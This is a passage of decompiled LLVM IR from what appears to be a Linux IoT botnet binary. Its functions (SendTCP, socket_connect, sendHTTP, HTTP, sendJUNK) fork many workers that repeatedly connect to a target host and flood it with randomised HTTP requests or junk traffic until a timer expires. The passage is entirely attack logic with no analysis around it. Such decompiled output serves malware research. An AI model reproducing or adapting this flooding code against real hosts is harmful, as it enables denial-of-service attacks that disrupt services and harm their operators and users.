  br i1 %v3_1000b4f45, label %dec_label_pc_1000b404, label %dec_label_pc_1000b4fc

dec_label_pc_1000b404:                            ; preds = %dec_label_pc_1000b344, %dec_label_pc_1000b404
  %storemerge37 = phi i32 [ %v1_1000b4e0, %dec_label_pc_1000b404 ], [ 0, %dec_label_pc_1000b344 ]
  store i32 %storemerge37, i32* @r11, align 4
  %v1_1000b410 = mul i32 %storemerge37, 28
  %v2_1000b414 = add i32 %v1_1000b410, %v1_1000b3c8
  %v2_1000b418 = inttoptr i32 %v2_1000b414 to i32*
  store i32 %storemerge37, i32* %v2_1000b418, align 4
  %v1_1000b42c = add i32 %v2_1000b414, 4
  %v2_1000b434 = inttoptr i32 %v1_1000b42c to i32*
  store i32 %v1_1000b2a4, i32* %v2_1000b434, align 4
  %v1_1000b448 = add i32 %v2_1000b414, 8
  %v2_1000b450 = inttoptr i32 %v1_1000b448 to i32*
  store i32 %v1_1000b2c0, i32* %v2_1000b450, align 4
  %v1_1000b464 = add i32 %v2_1000b414, 12
  %v2_1000b46c = inttoptr i32 %v1_1000b464 to i32*
  store i32 %v2_1000b2d4, i32* %v2_1000b46c, align 4
  %v1_1000b480 = add i32 %v2_1000b414, 16
  %v2_1000b488 = inttoptr i32 %v1_1000b480 to i32*
  store i32 %v1_1000b2f8, i32* %v2_1000b488, align 4
  %v1_1000b49c = add i32 %v2_1000b414, 20
  %v2_1000b4a4 = inttoptr i32 %v1_1000b49c to i32*
  store i32 %storemerge1, i32* %v2_1000b4a4, align 4
  %v1_1000b4b8 = add i32 %v2_1000b414, 24
  %v2_1000b4c0 = inttoptr i32 %v1_1000b4b8 to i32*
  store i32 32, i32* %v2_1000b4c0, align 4
  %v3_1000b4d8 = call i32 @SendTCP(i32* %v2_1000b418, i32 %v1_1000b3c8)
  %v1_1000b4e0 = add nuw nsw i32 %storemerge37, 1
  %v3_1000b4f4 = icmp sgt i32 %v1_1000b4ec, %v1_1000b4e0
  br i1 %v3_1000b4f4, label %dec_label_pc_1000b404, label %dec_label_pc_1000b4fc

dec_label_pc_1000b4fc:                            ; preds = %dec_label_pc_1000b404, %dec_label_pc_1000b344
  %v8_1000b520 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002ba8c.468 to i32), i32 %arg2, i32 %v4_1000b3ec)
  store i32 ptrtoint ([3 x i8]* @global_var_1000b530.469 to i32), i32* @lr, align 4
  %v1_1000b52c = call i32 @sleep(i32 %v1_1000b2c0)
  %v0_1000b534 = call i32 @__GI_exit()
  br label %dec_label_pc_1000b538

dec_label_pc_1000b538:                            ; preds = %entry, %dec_label_pc_1000b268, %dec_label_pc_1000b4fc
  %v0_1000b55c = phi i32 [ %v1_1000b1ac, %entry ], [ %v6_1000b27c, %dec_label_pc_1000b268 ], [ %v0_1000b534, %dec_label_pc_1000b4fc ]
  ret i32 %v0_1000b55c

; uselistorder directives
  uselistorder i32 %v1_1000b4e0, { 1, 0 }
  uselistorder i32 %storemerge37, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000b4ec, { 1, 0 }
  uselistorder i32 %v1_1000b3c8, { 1, 0 }
  uselistorder i32 %arg4, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_1000b538, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b404, { 1, 0 }
  uselistorder label %dec_label_pc_1000b344, { 1, 0 }
  uselistorder label %dec_label_pc_1000b30c, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268481936, i32* @lr, align 4
  %v1_1000b58c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_1000b59c = icmp eq i32 %v1_1000b58c, 0
  br i1 %v3_1000b59c, label %dec_label_pc_1000b5a4, label %dec_label_pc_1000b5b0

dec_label_pc_1000b5a4:                            ; preds = %entry
  br label %dec_label_pc_1000b688

dec_label_pc_1000b5b0:                            ; preds = %entry
  %v1_1000b5b4 = add i32 %v1_1000b58c, 16
  %v2_1000b5b4 = inttoptr i32 %v1_1000b5b4 to i32*
  %v3_1000b5b4 = load i32, i32* %v2_1000b5b4, align 4
  %v1_1000b5b8 = inttoptr i32 %v3_1000b5b4 to i32*
  %v2_1000b5b8 = load i32, i32* %v1_1000b5b8, align 4
  %v1_1000b5c0 = add i32 %v1_1000b58c, 12
  %v2_1000b5c0 = inttoptr i32 %v1_1000b5c0 to i32*
  %v3_1000b5c0 = load i32, i32* %v2_1000b5c0, align 4
  %v2_1000b5c8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1000b5cc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_1000b5c0, i32* @r5, align 4
  store i32 268482016, i32* @lr, align 4
  %v4_1000b5dc = call i32 @bcopy(i32 %v2_1000b5b8, i32 %v2_1000b5cc, i32 %v3_1000b5c0, i32 %v2_1000b5c8)
  %v4_1000b5e0 = zext i16 %arg2 to i32
  store i32 %v4_1000b5e0, i32* @r3, align 4
  %v1_1000b5ec = call i32 @htons(i32 %v4_1000b5e0)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268482064, i32* @lr, align 4
  %v3_1000b60c = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_1000b618 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268482100, i32* @lr, align 4
  %v5_1000b630 = call i32 @__GI_setsockopt(i32 %v3_1000b60c, i32 6, i32 1, i32 %v2_1000b618, i32 4)
  %v4_1000b63c = icmp eq i32 %v3_1000b60c, -1
  br i1 %v4_1000b63c, label %dec_label_pc_1000b644, label %dec_label_pc_1000b650

dec_label_pc_1000b644:                            ; preds = %dec_label_pc_1000b5b0
  br label %dec_label_pc_1000b688

dec_label_pc_1000b650:                            ; preds = %dec_label_pc_1000b5b0
  store i32 268482148, i32* @lr, align 4
  %v3_1000b660 = call i32 @connect(i32 %v3_1000b60c, i32 %v2_1000b5c8, i32 16)
  %v4_1000b66c = icmp eq i32 %v3_1000b660, -1
  br i1 %v4_1000b66c, label %dec_label_pc_1000b674, label %dec_label_pc_1000b680

dec_label_pc_1000b674:                            ; preds = %dec_label_pc_1000b650
  br label %dec_label_pc_1000b688

dec_label_pc_1000b680:                            ; preds = %dec_label_pc_1000b650
  br label %dec_label_pc_1000b688

dec_label_pc_1000b688:                            ; preds = %dec_label_pc_1000b674, %dec_label_pc_1000b644, %dec_label_pc_1000b5a4, %dec_label_pc_1000b680
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_1000b5a4 ], [ 0, %dec_label_pc_1000b644 ], [ 0, %dec_label_pc_1000b674 ], [ %v3_1000b60c, %dec_label_pc_1000b680 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_1000b5c8, { 1, 0 }
  uselistorder i32 %v3_1000b5c0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_1000b688, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1128 = alloca i32, align 4
  store i32 268482304, i32* @lr, align 4
  %v1_1000b6fc = call i32 @__GI_time(i32 0)
  %v2_1000b708 = add i32 %v1_1000b6fc, %arg5
  store i32 268482324, i32* @lr, align 4
  %v0_1000b710 = call i32 @random()
  %v1_1000b728 = urem i32 %v0_1000b710, 49
  %v1_1000b74c = mul nuw nsw i32 %v1_1000b728, 4
  %v2_1000b750 = add i32 %v1_1000b74c, ptrtoint ([255 x i8*]* @global_var_10040294.244 to i32)
  %v1_1000b754 = inttoptr i32 %v2_1000b750 to i32*
  %v2_1000b754 = load i32, i32* %v1_1000b754, align 4
  store i32 268482400, i32* @lr, align 4
  %v0_1000b75c = call i32 @random()
  %v2_1000b774 = srem i32 %v0_1000b75c, 3
  %v1_1000b790 = mul nsw i32 %v2_1000b774, 4
  %v2_1000b794 = ptrtoint i32* %stack_var_-1128 to i32
  %v2_1000b798 = add i32 %v2_1000b794, 24
  %v1_1000b79c = add i32 %v2_1000b798, %v1_1000b790
  %v1_1000b7a0 = inttoptr i32 %v1_1000b79c to i32*
  %v2_1000b7a0 = load i32, i32* %v1_1000b7a0, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_1000b7ac = call i32 @__GI_strlen()
  store i32 %arg4, i32* @r3, align 4
  %v0_1000b7b8 = call i32 @__GI_strlen()
  %v2_1000b7c0 = add i32 %v0_1000b7ac, %v0_1000b7b8
  store i32 %v2_1000b754, i32* @r3, align 4
  %v0_1000b7c8 = call i32 @__GI_strlen()
  %v2_1000b7d0 = add i32 %v2_1000b7c0, %v0_1000b7c8
  store i32 %v2_1000b7a0, i32* @r3, align 4
  %v0_1000b7d8 = call i32 @__GI_strlen()
  %v2_1000b7e0 = add i32 %v2_1000b7d0, %v0_1000b7d8
  %v1_1000b7e4 = add i32 %v2_1000b7e0, 55
  %v2_1000b7f0 = icmp sgt i32 %v1_1000b7e4, 1023
  br i1 %v2_1000b7f0, label %dec_label_pc_1000b8dc, label %dec_label_pc_1000b7f8

dec_label_pc_1000b7f8:                            ; preds = %entry
  %v2_1000b7fc = ptrtoint i32* %stack_var_-1092 to i32
  store i32 %v2_1000b7fc, i32* @r3, align 4
  store i32 %v1_1000b7e4, i32* @r4, align 4
  store i32 ptrtoint ([64 x i8]* @global_var_1002baec.476 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000b828.477 to i32), i32* @lr, align 4
  %v9_1000b824 = call i32 @__GI_snprintf(i32 %v2_1000b7fc, i32 %v1_1000b7e4, i32 ptrtoint ([64 x i8]* @global_var_1002baec.476 to i32), i32 %arg2, i32 %arg4, i32 %v2_1000b754, i32 %v2_1000b7a0, i32 %v1_1000b7e4)
  %v2_1000b8d411 = icmp sgt i32 %arg6, 0
  br i1 %v2_1000b8d411, label %dec_label_pc_1000b834.lr.ph, label %dec_label_pc_1000b8dc

dec_label_pc_1000b834.lr.ph:                      ; preds = %dec_label_pc_1000b7f8
  %v2_1000b85c = trunc i32 %arg3 to i16
  br label %dec_label_pc_1000b834

dec_label_pc_1000b834:                            ; preds = %dec_label_pc_1000b834.lr.ph, %dec_label_pc_1000b8c0
  %storemerge614 = phi i32 [ 0, %dec_label_pc_1000b834.lr.ph ], [ %v1_1000b8c4, %dec_label_pc_1000b8c0 ]
  store i32 268482616, i32* @lr, align 4
  %v0_1000b834 = call i32 @fork()
  %v3_1000b83c = icmp eq i32 %v0_1000b834, 0
  br i1 %v3_1000b83c, label %dec_label_pc_1000b8c0, label %dec_label_pc_1000b8a0.preheader

dec_label_pc_1000b8a0.preheader:                  ; preds = %dec_label_pc_1000b834
  store i32 268482728, i32* @lr, align 4
  %v1_1000b8a47 = call i32 @__GI_time(i32 0)
  %v2_1000b8b08 = icmp slt i32 %v1_1000b8a47, %v2_1000b708
  br i1 %v2_1000b8b08, label %dec_label_pc_1000b848, label %dec_label_pc_1000b8b8

dec_label_pc_1000b848:                            ; preds = %dec_label_pc_1000b8a0.preheader, %dec_label_pc_1000b8a0.backedge
  %v3_1000b85c = call i32 @socket_connect(i32 %arg1, i16 %v2_1000b85c)
  store i32 %v3_1000b85c, i32* %stack_var_-1128, align 4
  %v3_1000b86c = icmp eq i32 %v3_1000b85c, 0
  br i1 %v3_1000b86c, label %dec_label_pc_1000b8a0.backedge, label %dec_label_pc_1000b874

dec_label_pc_1000b874:                            ; preds = %dec_label_pc_1000b848
  store i32 %v2_1000b7fc, i32* @r3, align 4
  %v0_1000b87c = call i32 @__GI_strlen()
  %v3_1000b888 = load i32, i32* %stack_var_-1128, align 4
  store i32 268482712, i32* @lr, align 4
  %v3_1000b894 = call i32 @write(i32 %v3_1000b888, i32 %v2_1000b7fc, i32 %v0_1000b87c)
  %v3_1000b898 = load i32, i32* %stack_var_-1128, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b8a0.478 to i32), i32* @lr, align 4
  %v1_1000b89c = call i32 @close(i32 %v3_1000b898)
  br label %dec_label_pc_1000b8a0.backedge

dec_label_pc_1000b8a0.backedge:                   ; preds = %dec_label_pc_1000b874, %dec_label_pc_1000b848
  store i32 268482728, i32* @lr, align 4
  %v1_1000b8a4 = call i32 @__GI_time(i32 0)
  %v2_1000b8b0 = icmp slt i32 %v1_1000b8a4, %v2_1000b708
  br i1 %v2_1000b8b0, label %dec_label_pc_1000b848, label %dec_label_pc_1000b8b8

dec_label_pc_1000b8b8:                            ; preds = %dec_label_pc_1000b8a0.backedge, %dec_label_pc_1000b8a0.preheader
  %v1_1000b8bc = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_1000b8c0

dec_label_pc_1000b8c0:                            ; preds = %dec_label_pc_1000b834, %dec_label_pc_1000b8b8
  %v0_1000b8f417 = phi i32 [ 0, %dec_label_pc_1000b834 ], [ %v1_1000b8bc, %dec_label_pc_1000b8b8 ]
  %v1_1000b8c4 = add nuw nsw i32 %storemerge614, 1
  %v2_1000b8d4 = icmp slt i32 %v1_1000b8c4, %arg6
  br i1 %v2_1000b8d4, label %dec_label_pc_1000b834, label %dec_label_pc_1000b8dc

dec_label_pc_1000b8dc:                            ; preds = %dec_label_pc_1000b8c0, %dec_label_pc_1000b7f8, %entry
  %v0_1000b8f4 = phi i32 [ %v0_1000b7d8, %entry ], [ %v9_1000b824, %dec_label_pc_1000b7f8 ], [ %v0_1000b8f417, %dec_label_pc_1000b8c0 ]
  ret i32 %v0_1000b8f4

; uselistorder directives
  uselistorder i32 %v2_1000b7fc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000b7e4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000b7d8, { 1, 0 }
  uselistorder i32 %v2_1000b708, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 2, 1, 0 }
  uselistorder i32 268482728, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @__GI_snprintf, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b8c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b848, { 1, 0 }
  uselistorder label %dec_label_pc_1000b834, { 1, 0 }
}

define i32 @HTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1000b934 = call i32 @mfork(i32 %arg2)
  %v3_1000b93c = icmp eq i32 %v1_1000b934, 0
  br i1 %v3_1000b93c, label %dec_label_pc_1000b944, label %dec_label_pc_1000bb60

dec_label_pc_1000b944:                            ; preds = %entry
  %v2_1000b948 = icmp sgt i32 %arg3, 5
  br i1 %v2_1000b948, label %dec_label_pc_1000b968, label %dec_label_pc_1000b950

dec_label_pc_1000b950:                            ; preds = %dec_label_pc_1000b944
  %v6_1000b964 = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_1002bb2c.479 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000b968

dec_label_pc_1000b968:                            ; preds = %dec_label_pc_1000b944, %dec_label_pc_1000b950
  %v1_1000b96c = add i32 %arg4, 8
  %v1_1000b970 = inttoptr i32 %v1_1000b96c to i32*
  %v2_1000b970 = load i32, i32* %v1_1000b970, align 4
  store i32 %v2_1000b970, i32* @r29, align 4
  %v1_1000b978 = add i32 %arg4, 24
  %v1_1000b97c = inttoptr i32 %v1_1000b978 to i32*
  %v2_1000b97c = load i32, i32* %v1_1000b97c, align 4
  store i32 268482952, i32* @lr, align 4
  %v1_1000b984 = call i32 @atol(i32 %v2_1000b97c)
  %v0_1000b99c = load i32, i32* @r29, align 4
  %v7_1000b9a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1002bb6c.480 to i32), i32 %arg2, i32 %v0_1000b99c)
  %v1_1000b9b0 = add i32 %arg4, 4
  %v1_1000b9b4 = inttoptr i32 %v1_1000b9b0 to i32*
  %v2_1000b9b4 = load i32, i32* %v1_1000b9b4, align 4
  store i32 %v2_1000b9b4, i32* @r3, align 4
  store i32 268483012, i32* @lr, align 4
  %v2_1000b9c0 = call i32 @__GI_strchr(i32 %v2_1000b9b4, i32 44)
  %v3_1000b9c8 = icmp eq i32 %v2_1000b9c0, 0
  br i1 %v3_1000b9c8, label %dec_label_pc_1000bac0, label %dec_label_pc_1000b9d0

dec_label_pc_1000b9d0:                            ; preds = %dec_label_pc_1000b968
  %v2_1000b9d8 = load i32, i32* %v1_1000b9b4, align 4
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268483052, i32* @lr, align 4
  %v4_1000b9e8 = call i32 @__GI_strtok(i32 %v2_1000b9d8, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000bab45 = icmp eq i32 %v4_1000b9e8, 0
  br i1 %v3_1000bab45, label %dec_label_pc_1000bb60, label %dec_label_pc_1000b9f8.lr.ph

dec_label_pc_1000b9f8.lr.ph:                      ; preds = %dec_label_pc_1000b9d0
  %v1_1000ba24 = add i32 %arg4, 12
  %v1_1000ba28 = inttoptr i32 %v1_1000ba24 to i32*
  %v1_1000ba48 = add i32 %arg4, 20
  %v1_1000ba4c = inttoptr i32 %v1_1000ba48 to i32*
  br label %dec_label_pc_1000b9f8

dec_label_pc_1000b9f8:                            ; preds = %dec_label_pc_1000b9f8.lr.ph, %dec_label_pc_1000ba98
  store i32 268483068, i32* @lr, align 4
  %v0_1000b9f8 = call i32 @listFork()
  %v3_1000ba00 = icmp eq i32 %v0_1000b9f8, 0
  br i1 %v3_1000ba00, label %dec_label_pc_1000ba08, label %dec_label_pc_1000ba98

dec_label_pc_1000ba08:                            ; preds = %dec_label_pc_1000b9f8
  %v2_1000ba10 = load i32, i32* %v1_1000b9b4, align 4
  store i32 %v2_1000ba10, i32* @r29, align 4
  %v2_1000ba28 = load i32, i32* %v1_1000ba28, align 4
  store i32 268483124, i32* @lr, align 4
  %v1_1000ba30 = call i32 @atol(i32 %v2_1000ba28)
  store i32 %v1_1000ba30, i32* @r27, align 4
  %v2_1000ba4c = load i32, i32* %v1_1000ba4c, align 4
  store i32 268483160, i32* @lr, align 4
  %v1_1000ba54 = call i32 @atol(i32 %v2_1000ba4c)
  %v2_1000ba64 = load i32, i32* %v1_1000b97c, align 4
  store i32 268483184, i32* @lr, align 4
  %v1_1000ba6c = call i32 @atol(i32 %v2_1000ba64)
  %v0_1000ba74 = load i32, i32* @r29, align 4
  %v0_1000ba78 = load i32, i32* @r28, align 4
  %v0_1000ba7c = load i32, i32* @r27, align 4
  %v0_1000ba80 = load i32, i32* @r26, align 4
  %v0_1000ba84 = load i32, i32* @r25, align 4
  %v6_1000ba8c = call i32 @sendHTTP(i32 %v0_1000ba74, i32 %v0_1000ba78, i32 %v0_1000ba7c, i32 %v0_1000ba80, i32 %v0_1000ba84, i32 %v1_1000ba6c)
  %v1_1000ba94 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ba98

dec_label_pc_1000ba98:                            ; preds = %dec_label_pc_1000b9f8, %dec_label_pc_1000ba08
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268483240, i32* @lr, align 4
  %v4_1000baa4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000bab4 = icmp eq i32 %v4_1000baa4, 0
  br i1 %v3_1000bab4, label %dec_label_pc_1000bb60, label %dec_label_pc_1000b9f8

dec_label_pc_1000bac0:                            ; preds = %dec_label_pc_1000b968
  store i32 268483268, i32* @lr, align 4
  %v0_1000bac0 = call i32 @listFork()
  %v3_1000bac8 = icmp eq i32 %v0_1000bac0, 0
  br i1 %v3_1000bac8, label %dec_label_pc_1000bad0, label %dec_label_pc_1000bb60

dec_label_pc_1000bad0:                            ; preds = %dec_label_pc_1000bac0
  %v2_1000bad8 = load i32, i32* %v1_1000b9b4, align 4
  store i32 %v2_1000bad8, i32* @r29, align 4
  %v1_1000baec = add i32 %arg4, 12
  %v1_1000baf0 = inttoptr i32 %v1_1000baec to i32*
  %v2_1000baf0 = load i32, i32* %v1_1000baf0, align 4
  store i32 268483324, i32* @lr, align 4
  %v1_1000baf8 = call i32 @atol(i32 %v2_1000baf0)
  store i32 %v1_1000baf8, i32* @r27, align 4
  %v1_1000bb10 = add i32 %arg4, 20
  %v1_1000bb14 = inttoptr i32 %v1_1000bb10 to i32*
  %v2_1000bb14 = load i32, i32* %v1_1000bb14, align 4
  store i32 268483360, i32* @lr, align 4
  %v1_1000bb1c = call i32 @atol(i32 %v2_1000bb14)
  %v2_1000bb2c = load i32, i32* %v1_1000b97c, align 4
  store i32 268483384, i32* @lr, align 4
  %v1_1000bb34 = call i32 @atol(i32 %v2_1000bb2c)
  %v0_1000bb3c = load i32, i32* @r29, align 4
  %v0_1000bb40 = load i32, i32* @r28, align 4
  %v0_1000bb44 = load i32, i32* @r27, align 4
  %v0_1000bb48 = load i32, i32* @r26, align 4
  %v0_1000bb4c = load i32, i32* @r25, align 4
  %v6_1000bb54 = call i32 @sendHTTP(i32 %v0_1000bb3c, i32 %v0_1000bb40, i32 %v0_1000bb44, i32 %v0_1000bb48, i32 %v0_1000bb4c, i32 %v1_1000bb34)
  %v1_1000bb5c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bb60:                            ; preds = %dec_label_pc_1000ba98, %dec_label_pc_1000b9d0, %dec_label_pc_1000bac0, %entry, %dec_label_pc_1000bad0
  %v0_1000bb88 = phi i32 [ %v0_1000bac0, %dec_label_pc_1000bac0 ], [ %v1_1000b934, %entry ], [ %v1_1000bb5c, %dec_label_pc_1000bad0 ], [ 0, %dec_label_pc_1000b9d0 ], [ 0, %dec_label_pc_1000ba98 ]
  ret i32 %v0_1000bb88

; uselistorder directives
  uselistorder i32* %v1_1000b9b4, { 2, 0, 1, 3 }
  uselistorder i32* %v1_1000b97c, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendHTTP, { 1, 0 }
  uselistorder i32 ()* @listFork, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), { 0, 9, 1, 10, 2, 11, 3, 12, 4, 13, 5, 14, 6, 15, 7, 16, 8, 17 }
  uselistorder i32 %arg4, { 2, 3, 0, 1, 4, 6, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb60, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000ba98, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b968, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000bb8c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000bb8c, i32* %stack_var_-256, align 4
  store i32 268483516, i32* @lr, align 4
  %v0_1000bbb8 = call i32 @getdtablesize()
  %v1_1000bbc0 = udiv i32 %v0_1000bbb8, 2
  %v2_1000bbc0 = and i32 %v0_1000bbb8, -2147483648
  %v3_1000bbc0 = or i32 %v1_1000bbc0, %v2_1000bbc0
  store i32 2, i32* %stack_var_-212, align 4
  %v1_1000bbd8 = urem i32 %arg2, 65536
  store i32 %v1_1000bbd8, i32* @r3, align 4
  %v1_1000bbe0 = call i32 @htons(i32 %v1_1000bbd8)
  %v2_1000bbec = ptrtoint i32* %stack_var_-212 to i32
  %v4_1000bbfc = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-208, i32 %v2_1000bbec)
  %v3_1000bc04 = icmp eq i32 %v4_1000bbfc, 0
  br i1 %v3_1000bc04, label %dec_label_pc_1000bc10, label %dec_label_pc_1000c0ec

dec_label_pc_1000bc10:                            ; preds = %entry
  %v2_1000bc14 = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_1000bc14, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268483624, i32* @lr, align 4
  %v0_1000bc24 = call i32 @__GI_memset()
  %v1_1000bc2c = mul i32 %v1_1000bbc0, 8
  %v1_1000bc34 = add i32 %v1_1000bc2c, 30
  %v1_1000bc38 = and i32 %v1_1000bc34, -16
  %v2_1000bc40 = load i32, i32* %stack_var_-256, align 4
  %v1_1000bc48 = load i32, i32* @r1, align 4
  %v3_1000bc48 = sub i32 %v1_1000bc48, %v1_1000bc38
  %v4_1000bc48 = inttoptr i32 %v3_1000bc48 to i32*
  store i32 %v2_1000bc40, i32* %v4_1000bc48, align 4
  %v1_1000bc58 = add i32 %v3_1000bc48, 23
  %v1_1000bc5c = and i32 %v1_1000bc58, -16
  %v1_1000bc78 = mul i32 %v3_1000bbc0, 5
  store i32 %v1_1000bc5c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_1000bc78, i32* @r5, align 4
  store i32 268483724, i32* @lr, align 4
  %v0_1000bc88 = call i32 @__GI_memset()
  store i32 1024, i32* @r3, align 4
  store i32 268483732, i32* @lr, align 4
  %v0_1000bc90 = call i32 @malloc()
  store i32 %v0_1000bc90, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000bcac.484 to i32), i32* @lr, align 4
  %v0_1000bca8 = call i32 @__GI_memset()
  store i32 268483772, i32* @lr, align 4
  %v1_1000bcb8 = call i32 @__GI_time(i32 0)
  %v2_1000bcc4 = add i32 %v1_1000bcb8, %arg3
  store i32 268484828, i32* @lr, align 4
  %v1_1000c0d810 = call i32 @__GI_time(i32 0)
  %v2_1000c0e411 = icmp slt i32 %v1_1000c0d810, %v2_1000bcc4
  br i1 %v2_1000c0e411, label %dec_label_pc_1000c0c4.preheader.lr.ph, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0c4.preheader.lr.ph:            ; preds = %dec_label_pc_1000bc10
  %v2_1000c0cc5 = icmp sgt i32 %v3_1000bbc0, 0
  %v2_1000be28 = ptrtoint i32* %stack_var_-196 to i32
  %v2_1000be8c = ptrtoint i32* %stack_var_-248 to i32
  %v2_1000be90 = add i32 %v2_1000be8c, 52
  %v2_1000bf00 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1000bf4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000bf50 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_1000c0c4.preheader

dec_label_pc_1000bcdc:                            ; preds = %dec_label_pc_1000c0c4.preheader, %dec_label_pc_1000c0b8
  %storemerge28 = phi i32 [ %v1_1000c0bc, %dec_label_pc_1000c0b8 ], [ 0, %dec_label_pc_1000c0c4.preheader ]
  %v1_1000bce4 = mul i32 %storemerge28, 8
  %v2_1000bce8 = add i32 %v1_1000bce4, %v1_1000bc5c
  %v1_1000bcec = or i32 %v2_1000bce8, 4
  %v2_1000bcec = inttoptr i32 %v1_1000bcec to i8*
  %v3_1000bcec = load i8, i8* %v2_1000bcec, align 4
  %v1_1000bcfc = icmp eq i8 %v3_1000bcec, 0
  %v3_1000bcfc = icmp eq i8 %v3_1000bcec, 1
  br i1 %v3_1000bcfc, label %dec_label_pc_1000be28, label %dec_label_pc_1000bd04

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bcdc
  %v3_1000bd08 = icmp eq i8 %v3_1000bcec, 2
  br i1 %v3_1000bd08, label %dec_label_pc_1000c014, label %dec_label_pc_1000bd10

dec_label_pc_1000bd10:                            ; preds = %dec_label_pc_1000bd04
  br i1 %v1_1000bcfc, label %dec_label_pc_1000bd20, label %dec_label_pc_1000c0b8

dec_label_pc_1000bd20:                            ; preds = %dec_label_pc_1000bd10
  store i32 268483892, i32* @lr, align 4
  %v3_1000bd30 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000bd3c = mul i32 %storemerge28, 8
  %v2_1000bd40 = add i32 %v1_1000bd3c, %v1_1000bc5c
  %v2_1000bd44 = inttoptr i32 %v2_1000bd40 to i32*
  store i32 %v3_1000bd30, i32* %v2_1000bd44, align 8
  %v1_1000bd58 = inttoptr i32 %v2_1000bce8 to i32*
  %v2_1000bd6c = load i32, i32* %v1_1000bd58, align 8
  store i32 268483972, i32* @lr, align 4
  %v3_1000bd80 = call i32 @fcntl(i32 %v2_1000bd6c, i32 3, i32 0)
  %v1_1000bd88 = or i32 %v3_1000bd80, 2048
  %v0_1000bd8c = load i32, i32* @r29, align 4
  store i32 268484000, i32* @lr, align 4
  %v3_1000bd9c = call i32 @fcntl(i32 %v0_1000bd8c, i32 4, i32 %v1_1000bd88)
